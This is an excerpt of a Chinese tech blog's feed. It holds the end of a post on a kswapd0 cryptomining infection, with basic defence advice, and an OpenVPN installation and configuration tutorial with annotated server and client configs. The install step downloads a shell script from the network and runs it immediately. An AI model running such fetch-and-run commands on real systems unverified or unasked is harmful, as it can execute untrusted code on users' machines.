id="2、如何防御">2、如何防御</h2><p>1、修改我们的账号密码，加强复杂度，不要使用口令</p><p>2、公有云添加白名单策略，业务端口只允许公司出口IP访问</p><hr><p><a href="https://blog.csdn.net/subfate/article/details/106546646" target="_blank" rel="noopener" title="https://blog.csdn.net/subfate/article/details/106546646">https://blog.csdn.net/subfate/article/details/106546646</a></p><p><a href="https://www.cnblogs.com/autopwn/p/17355657.html" target="_blank" rel="noopener" title="https://www.cnblogs.com/autopwn/p/17355657.html">https://www.cnblogs.com/autopwn/p/17355657.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;kswapd0挖矿病毒攻击记录&lt;/h1&gt;
&lt;h1&gt;一、起因与病毒分析&lt;/h1&gt;
&lt;h2 id=&quot;1、起因&quot;&gt;1、起因&lt;/h2&gt;
&lt;p&gt;最近内网穿透服务以及自建的博客一直掉线，重启服务也不行，用 top 查看发现1个kswapd0进程占用了一整个核（机器是2C4G），遂查刚开始以为是使用swap分区与内存换页操作交换数据造成的，但是清理了缓存仍无果，最终发现被挖矿木马攻击了。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux运维" scheme="https://blog.shawncoding.top/categories/Linux%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="linux基础" scheme="https://blog.shawncoding.top/tags/linux%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>OpenVPN 安装与使用</title>
    <link href="https://blog.shawncoding.top/posts/2ec63753.html"/>
    <id>https://blog.shawncoding.top/posts/2ec63753.html</id>
    <published>2024-02-29T12:10:25.000Z</published>
    <updated>2024-02-29T12:13:08.624Z</updated>
    
    <content type="html"><![CDATA[<h1>OpenVPN 安装与使用</h1><h1>一、一键安装与使用</h1><h2 id="1、服务端安装使用">1、服务端安装使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入Linux服务器以后，请使用下面的一键安装命令</span></span><br><span class="line"><span class="comment"># 脚本来源于开源Github:https://github.com/Nyr/openvpn-install</span></span><br><span class="line"><span class="comment"># 可能会下载失败，需要手动或者科学</span></span><br><span class="line">wget https://git.io/vpn -O openvpn-install.sh &amp;&amp; bash openvpn-install.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装失败的话，先下载在执行</span></span><br><span class="line">bash openvpn-install.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># 另一个脚本，但是大差不差，可以结合使用</span></span><br><span class="line"><span class="comment"># https://github.com/hwdsl2/openvpn-install/blob/master/README-zh.md</span></span><br></pre></td></tr></table></figure><p>然后按照流程选择，注意公网的ip和端口要保证通</p><a id="more"></a><p><img src="http://qnypic.shawncoding.top/blog/202402291902388.png" alt></p><p>都提示success代表安装成功，然后根据上图底部的提示路径把ovpn文件下载下来，对于管理客户端，就再次执行<code>bash openvpn-install.sh</code>，可以添加、删除、查看等，网段默认是10.8.0.x，按照客户端启动顺序给予分配ip，同时客户端可以访问server端所在的内网(可以使用route命令查看，原因是转发到vpn网卡的流量全部进行了转发)</p><h2 id="2、客户端启动">2、客户端启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows下载，打开后导入下载的ovpn文件，连接即可</span></span><br><span class="line">https://openvpn.net/community-downloads/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux客户端启动</span></span><br><span class="line">yum install openvpn -y</span><br><span class="line"><span class="comment"># 启动Linux客户端的openvpn</span></span><br><span class="line"><span class="comment"># 详细版本</span></span><br><span class="line"><span class="comment"># --daemon：openvpn以daemon方式启动</span></span><br><span class="line"><span class="comment"># --cd dir：配置文件的目录，openvpn初始化前，先切换到此目录</span></span><br><span class="line"><span class="comment"># --config file：客户端配置文件的路径</span></span><br><span class="line"><span class="comment"># --log-append file：日志文件路径，如果文件不存在会自动创建</span></span><br><span class="line">openvpn --daemon --<span class="built_in">cd</span> /etc/openvpn --config client.ovpn --<span class="built_in">log</span>-append /var/<span class="built_in">log</span>/openvpn.log</span><br><span class="line"><span class="comment"># 快速版本</span></span><br><span class="line">openvpn --daemon --config xxxx.ovpn</span><br></pre></td></tr></table></figure><h1>二、使用进阶</h1><h2 id="1、网段与静态ip">1、网段与静态ip</h2><h3 id="1-1-启停脚本">1.1 启停脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自动启停的脚本路径</span></span><br><span class="line"><span class="comment"># /etc/systemd/system/multi-user.target.wants/openvpn-server@server.service</span></span><br><span class="line"><span class="comment">#启动openvpn命令</span></span><br><span class="line">systemctl start openvpn-server@server.service </span><br><span class="line"><span class="comment">#停止openvpn命令</span></span><br><span class="line">systemctl stop openvpn-server@server.service</span><br></pre></td></tr></table></figure><h3 id="1-2-网段修改">1.2 网段修改</h3><p>默认启动网段都是10.8.0.x，如果想修改自定义网段，进入<code>vim /etc/openvpn/server/server.conf</code>，修改对应的配置，重启server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到这行，进行修改</span></span><br><span class="line">server 192.168.0.0 255.255.255.0</span><br></pre></td></tr></table></figure><h3 id="1-3-静态ip设置">1.3 静态ip设置</h3><p>修改server.conf文件，然后对server端进行重启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有多个内网及公网的机器需要打通然后部署了openvpn服务，但是一旦有机器重启就好导致ip发生变化</span></span><br><span class="line"><span class="comment"># 在 VPN 服务器上创建一个客户端配置文件目录。例如，可以在/etc/openvpn/ccd 目录下创建一个子目录</span></span><br><span class="line">sudo mkdir /etc/openvpn/ccd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑 VPN 服务器配置文件，添加以下内容</span></span><br><span class="line"><span class="comment"># 告诉 OpenVPN 使用 /etc/openvpn/ccd 目录中的配置文件为每个客户端分配固定的 IP 地址，并将 IP 地址持久保存在 ipp.txt 文件中</span></span><br><span class="line">client-config-dir /etc/openvpn/ccd</span><br><span class="line">ifconfig-pool-persist ipp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于每个客户端，创建一个与其名称对应的配置文件，并指定需要分配给该客户端的固定 IP 地址</span></span><br><span class="line"><span class="comment"># 例如，如果有一个名为 client1 的客户端，可以创建一个名为 /etc/openvpn/ccd/client1 的文件，并在其中写入以下内容：</span></span><br><span class="line">ifconfig-push 10.8.0.10 255.255.255.0</span><br><span class="line"><span class="comment"># 可以为每个客户端创建类似的配置文件，只需更改 IP 地址即可，注意名字匹配</span></span><br><span class="line"><span class="comment"># 最后重启一下服务端即可</span></span><br></pre></td></tr></table></figure><h2 id="2、全量转发与选择性转发">2、全量转发与选择性转发</h2><p>默认不配置是全量转发，如果有多个内网网卡，可以设置选择性转发，在配置文件增加对应配置即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># #ignore-unknown-option block-outside-dns 、#block-outside-dns 一定要注释</span></span><br><span class="line"><span class="comment">#ignore-unknown-option block-outside-dns</span></span><br><span class="line"><span class="comment">#block-outside-dns</span></span><br><span class="line">verb 3</span><br><span class="line"><span class="comment"># route-nopull 如果在客户端配置文件中配route-nopull，openvpn 连接后将不会在电脑上添加任何路由，所有流量都将本地转发</span></span><br><span class="line">route-nopull</span><br><span class="line"><span class="comment"># vpn_gateway 如果在客户端配置文件中配vpn_gateway ，默认访问网络不走vpn隧道，如果可以通过添加该参数，下发路由，访问目的网络匹配到会自动进入VPN隧道</span></span><br><span class="line">route 192.168.1.0 255.255.255.0 vpn_gateway</span><br><span class="line">route 192.168.2.0 255.255.255.0 vpn_gateway</span><br></pre></td></tr></table></figure><p><code>net_gateway</code> 这个参数和 <code>vpn_gateway</code> 相反,表示在默认出去的访问全部走<code>openvpn</code> 时,强行指定部分IP地址段访问不通过 <code>openvpn</code> 出去。<code>max-routes</code> 参数表示可以添加路由的条数,默认只允许添加100条路由,如果少于100条路由可不加这个参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max-routes 1000</span><br><span class="line">route 192.168.1.0 255.255.255.0 net_gateway</span><br></pre></td></tr></table></figure><h1>三、配置文件详解</h1><h2 id="1、服务端配置文件">1、服务端配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment"># 针对多客户端的OpenVPN 2.0 的服务器端配置文件示例</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 本文件用于多客户端&lt;-&gt;单服务器端的OpenVPN服务器端配置</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># OpenVPN也支持单机&lt;-&gt;单机的配置(更多信息请查看网站上的示例页面)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 该配置支持Windows或者Linux/BSD系统。此外，在Windows上，记得将路径加上双引号，</span></span><br><span class="line"><span class="comment"># 并且使用两个反斜杠，例如："C:\\Program Files\\OpenVPN\\config\\foo.key"</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># '#' or ';'开头的均为注释内容</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#OpenVPN应该监听本机的哪些IP地址？</span></span><br><span class="line"><span class="comment">#该命令是可选的，如果不设置，则默认监听本机的所有IP地址。</span></span><br><span class="line">;<span class="built_in">local</span> a.b.c.d</span><br><span class="line"></span><br><span class="line"><span class="comment"># OpenVPN应该监听哪个TCP/UDP端口？</span></span><br><span class="line"><span class="comment"># 如果你想在同一台计算机上运行多个OpenVPN实例，你可以使用不同的端口号来区分它们。</span></span><br><span class="line"><span class="comment"># 此外，你需要在防火墙上开放这些端口。</span></span><br><span class="line">port 1194</span><br><span class="line"></span><br><span class="line"><span class="comment">#OpenVPN使用TCP还是UDP协议?</span></span><br><span class="line">;proto tcp</span><br><span class="line">proto udp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定OpenVPN创建的通信隧道类型。</span></span><br><span class="line"><span class="comment"># "dev tun"将会创建一个路由IP隧道，</span></span><br><span class="line"><span class="comment"># "dev tap"将会创建一个以太网隧道。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 如果你是以太网桥接模式，并且提前创建了一个名为"tap0"的与以太网接口进行桥接的虚拟接口，则你可以使用"dev tap0"</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 如果你想控制VPN的访问策略，你必须为TUN/TAP接口创建防火墙规则。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 在非Windows系统中，你可以给出明确的单位编号(unit number)，例如"tun0"。</span></span><br><span class="line"><span class="comment"># 在Windows中，你也可以使用"dev-node"。</span></span><br><span class="line"><span class="comment"># 在多数系统中，除非你部分禁用或者完全禁用了TUN/TAP接口的防火墙，否则VPN将不起作用。</span></span><br><span class="line">;dev tap</span><br><span class="line">dev tun</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你想配置多个隧道，你需要用到网络连接面板中TAP-Win32适配器的名称(例如"MyTap")。</span></span><br><span class="line"><span class="comment"># 在XP SP2或更高版本的系统中，你可能需要有选择地禁用掉针对TAP适配器的防火墙</span></span><br><span class="line"><span class="comment"># 通常情况下，非Windows系统则不需要该指令。</span></span><br><span class="line">;dev-node MyTap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置SSL/TLS根证书(ca)、证书(cert)和私钥(key)。</span></span><br><span class="line"><span class="comment"># 每个客户端和服务器端都需要它们各自的证书和私钥文件。</span></span><br><span class="line"><span class="comment"># 服务器端和所有的客户端都将使用相同的CA证书文件。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 通过easy-rsa目录下的一系列脚本可以生成所需的证书和私钥。</span></span><br><span class="line"><span class="comment"># 记住，服务器端和每个客户端的证书必须使用唯一的Common Name。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 你也可以使用遵循X509标准的任何密钥管理系统来生成证书和私钥。</span></span><br><span class="line"><span class="comment"># OpenVPN 也支持使用一个PKCS #12格式的密钥文件(详情查看站点手册页面的"pkcs12"指令)</span></span><br><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key  <span class="comment"># 该文件应该保密</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定迪菲·赫尔曼参数。</span></span><br><span class="line"><span class="comment"># 你可以使用如下名称命令生成你的参数：</span></span><br><span class="line"><span class="comment">#   openssl dhparam -out dh1024.pem 1024</span></span><br><span class="line"><span class="comment"># 如果你使用的是2048位密钥，使用2048替换其中的1024。</span></span><br><span class="line">dh dh1024.pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置服务器端模式，并提供一个VPN子网，以便于从中为客户端分配IP地址。</span></span><br><span class="line"><span class="comment"># 在此处的示例中，服务器端自身将占用10.8.0.1，其他的将提供客户端使用。</span></span><br><span class="line"><span class="comment"># 如果你使用的是以太网桥接模式，请注释掉该行。更多信息请查看官方手册页面。</span></span><br><span class="line">server 10.8.0.0 255.255.255.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定用于记录客户端和虚拟IP地址的关联关系的文件。</span></span><br><span class="line"><span class="comment"># 当重启OpenVPN时，再次连接的客户端将分配到与上一次分配相同的虚拟IP地址</span></span><br><span class="line">ifconfig-pool-persist ipp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 该指令仅针对以太网桥接模式。</span></span><br><span class="line"><span class="comment"># 首先，你必须使用操作系统的桥接能力将以太网网卡接口和TAP接口进行桥接。</span></span><br><span class="line"><span class="comment"># 然后，你需要手动设置桥接接口的IP地址、子网掩码；</span></span><br><span class="line"><span class="comment"># 在这里，我们假设为10.8.0.4和255.255.255.0。</span></span><br><span class="line"><span class="comment"># 最后，我们必须指定子网的一个IP范围(例如从10.8.0.50开始，到10.8.0.100结束)，以便于分配给连接的客户端。</span></span><br><span class="line"><span class="comment"># 如果你不是以太网桥接模式，直接注释掉这行指令即可。</span></span><br><span class="line">;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 该指令仅针对使用DHCP代理的以太网桥接模式，</span></span><br><span class="line"><span class="comment"># 此时客户端将请求服务器端的DHCP服务器，从而获得分配给它的IP地址和DNS服务器地址。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 在此之前，你也需要先将以太网网卡接口和TAP接口进行桥接。</span></span><br><span class="line"><span class="comment"># 注意：该指令仅用于OpenVPN客户端，并且该客户端的TAP适配器需要绑定到一个DHCP客户端上。</span></span><br><span class="line">;server-bridge</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送路由信息到客户端，以允许客户端能够连接到服务器背后的其他私有子网。</span></span><br><span class="line"><span class="comment"># (简而言之，就是允许客户端访问VPN服务器自身所在的其他局域网)</span></span><br><span class="line"><span class="comment"># 记住，这些私有子网也要将OpenVPN客户端的地址池(10.8.0.0/255.255.255.0)反馈回OpenVPN服务器。</span></span><br><span class="line">;push <span class="string">"route 192.168.10.0 255.255.255.0"</span></span><br><span class="line">;push <span class="string">"route 192.168.20.0 255.255.255.0"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为指定的客户端分配指定的IP地址，或者客户端背后也有一个私有子网想要访问VPN，</span></span><br><span class="line"><span class="comment"># 那么你可以针对该客户端的配置文件使用ccd子目录。</span></span><br><span class="line"><span class="comment"># (简而言之，就是允许客户端所在的局域网成员也能够访问VPN)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 举个例子：假设有个Common Name为"Thelonious"的客户端背后也有一个小型子网想要连接到VPN，该子网为192.168.40.128/255.255.255.248。</span></span><br><span class="line"><span class="comment"># 首先，你需要去掉下面两行指令的注释：</span></span><br><span class="line">;client-config-dir ccd</span><br><span class="line">;route 192.168.40.128 255.255.255.248</span><br><span class="line"><span class="comment"># 然后创建一个文件ccd/Thelonious，该文件的内容为：</span></span><br><span class="line"><span class="comment">#     iroute 192.168.40.128 255.255.255.248</span></span><br><span class="line"><span class="comment">#这样客户端所在的局域网就可以访问VPN了。</span></span><br><span class="line"><span class="comment"># 注意，这个指令只能在你是基于路由、而不是基于桥接的模式下才能生效。</span></span><br><span class="line"><span class="comment"># 比如，你使用了"dev tun"和"server"指令。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再举个例子：假设你想给Thelonious分配一个固定的IP地址10.9.0.1。</span></span><br><span class="line"><span class="comment"># 首先，你需要去掉下面两行指令的注释：</span></span><br><span class="line">;client-config-dir ccd</span><br><span class="line">;route 10.9.0.0 255.255.255.252</span><br><span class="line"><span class="comment"># 然后在文件ccd/Thelonious中添加如下指令：</span></span><br><span class="line"><span class="comment">#   ifconfig-push 10.9.0.1 10.9.0.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你想要为不同群组的客户端启用不同的防火墙访问策略，你可以使用如下两种方法：</span></span><br><span class="line"><span class="comment"># (1)运行多个OpenVPN守护进程，每个进程对应一个群组，并为每个进程(群组)启用适当的防火墙规则。</span></span><br><span class="line"><span class="comment"># (2) (进阶)创建一个脚本来动态地修改响应于来自不同客户的防火墙规则。</span></span><br><span class="line"><span class="comment"># 关于learn-address脚本的更多信息请参考官方手册页面。</span></span><br><span class="line">;learn-address ./script</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果启用该指令，所有客户端的默认网关都将重定向到VPN，这将导致诸如web浏览器、DNS查询等所有客户端流量都经过VPN。</span></span><br><span class="line"><span class="comment"># (为确保能正常工作，OpenVPN服务器所在计算机可能需要在TUN/TAP接口与以太网之间使用NAT或桥接技术进行连接)</span></span><br><span class="line">;push <span class="string">"redirect-gateway def1 bypass-dhcp"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 某些具体的Windows网络设置可以被推送到客户端，例如DNS或WINS服务器地址。</span></span><br><span class="line"><span class="comment"># 下列地址来自opendns.com提供的Public DNS 服务器。</span></span><br><span class="line">;push <span class="string">"dhcp-option DNS 208.67.222.222"</span></span><br><span class="line">;push <span class="string">"dhcp-option DNS 208.67.220.220"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉该指令的注释将允许不同的客户端之间相互"可见"(允许客户端之间互相访问)。</span></span><br><span class="line"><span class="comment"># 默认情况下，客户端只能"看见"服务器。为了确保客户端只能看见服务器，你还可以在服务器端的TUN/TAP接口上设置适当的防火墙规则。</span></span><br><span class="line">;client-to-client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果多个客户端可能使用相同的证书/私钥文件或Common Name进行连接，那么你可以取消该指令的注释。</span></span><br><span class="line"><span class="comment"># 建议该指令仅用于测试目的。对于生产使用环境而言，每个客户端都应该拥有自己的证书和私钥。</span></span><br><span class="line"><span class="comment"># 如果你没有为每个客户端分别生成Common Name唯一的证书/私钥，你可以取消该行的注释(但不推荐这样做)。</span></span><br><span class="line">;duplicate-cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># keepalive指令将导致类似于ping命令的消息被来回发送，以便于服务器端和客户端知道对方何时被关闭。</span></span><br><span class="line"><span class="comment"># 每10秒钟ping一次，如果120秒内都没有收到对方的回复，则表示远程连接已经关闭。</span></span><br><span class="line">keepalive 10 120</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出于SSL/TLS之外更多的安全考虑，创建一个"HMAC 防火墙"可以帮助抵御DoS攻击和UDP端口淹没攻击。</span></span><br><span class="line"><span class="comment"># 你可以使用以下命令来生成：</span></span><br><span class="line"><span class="comment">#   openvpn --genkey --secret ta.key</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 服务器和每个客户端都需要拥有该密钥的一个拷贝。</span></span><br><span class="line"><span class="comment"># 第二个参数在服务器端应该为'0'，在客户端应该为'1'。</span></span><br><span class="line">;tls-auth ta.key 0 <span class="comment"># 该文件应该保密</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个密码加密算法。</span></span><br><span class="line"><span class="comment"># 该配置项也必须复制到每个客户端配置文件中。</span></span><br><span class="line">;cipher BF-CBC        <span class="comment"># Blowfish (默认)</span></span><br><span class="line">;cipher AES-128-CBC   <span class="comment"># AES</span></span><br><span class="line">;cipher DES-EDE3-CBC  <span class="comment"># Triple-DES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在VPN连接上启用压缩。</span></span><br><span class="line"><span class="comment"># 如果你在此处启用了该指令，那么也应该在每个客户端配置文件中启用它。</span></span><br><span class="line">comp-lzo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许并发连接的客户端的最大数量</span></span><br><span class="line">;max-clients 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在完成初始化工作之后，降低OpenVPN守护进程的权限是个不错的主意。</span></span><br><span class="line"><span class="comment"># 该指令仅限于非Windows系统中使用。</span></span><br><span class="line">;user nobody</span><br><span class="line">;group nobody</span><br><span class="line"></span><br><span class="line"><span class="comment"># 持久化选项可以尽量避免访问那些在重启之后由于用户权限降低而无法访问的某些资源。</span></span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出一个简短的状态文件，用于显示当前的连接状态，该文件每分钟都会清空并重写一次。</span></span><br><span class="line">status openvpn-status.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认情况下，日志消息将写入syslog(在Windows系统中，如果以服务方式运行，日志消息将写入OpenVPN安装目录的log文件夹中)。</span></span><br><span class="line"><span class="comment"># 你可以使用log或者log-append来改变这种默认情况。</span></span><br><span class="line"><span class="comment"># "log"方式在每次启动时都会清空之前的日志文件。</span></span><br><span class="line"><span class="comment"># "log-append"这是在之前的日志内容后进行追加。</span></span><br><span class="line"><span class="comment"># 你可以使用两种方式之一(但不要同时使用)。</span></span><br><span class="line">;<span class="built_in">log</span>         openvpn.log</span><br><span class="line">;<span class="built_in">log</span>-append  openvpn.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为日志文件设置适当的冗余级别(0~9)。冗余级别越高，输出的信息越详细。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 0 表示静默运行，只记录致命错误。</span></span><br><span class="line"><span class="comment"># 4 表示合理的常规用法。</span></span><br><span class="line"><span class="comment"># 5 和 6 可以帮助调试连接错误。</span></span><br><span class="line"><span class="comment"># 9 表示极度冗余，输出非常详细的日志信息。</span></span><br><span class="line">verb 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重复信息的沉默度。</span></span><br><span class="line"><span class="comment"># 相同类别的信息只有前20条会输出到日志文件中。</span></span><br><span class="line">;mute 20</span><br></pre></td></tr></table></figure><h2 id="2、客户端配置文件">2、客户端配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">client                  <span class="comment">#指定当前VPN是客户端</span></span><br><span class="line">dev tun                 <span class="comment">#使用tun隧道传输协议</span></span><br><span class="line">proto udp               <span class="comment">#使用udp协议传输数据</span></span><br><span class="line">remote 10.0.0.2 1194   <span class="comment">#openvpn服务器IP地址端口号</span></span><br><span class="line">resolv-retry infinite   <span class="comment">#断线自动重新连接，在网络不稳定的情况下非常有用</span></span><br><span class="line">nobind                  <span class="comment">#不绑定本地特定的端口号</span></span><br><span class="line">ca ca.crt               <span class="comment">#指定CA证书的文件路径</span></span><br><span class="line">cert client.crt         <span class="comment">#指定当前客户端的证书文件路径</span></span><br><span class="line">key client.key          <span class="comment">#指定当前客户端的私钥文件路径</span></span><br><span class="line">verb 3                  <span 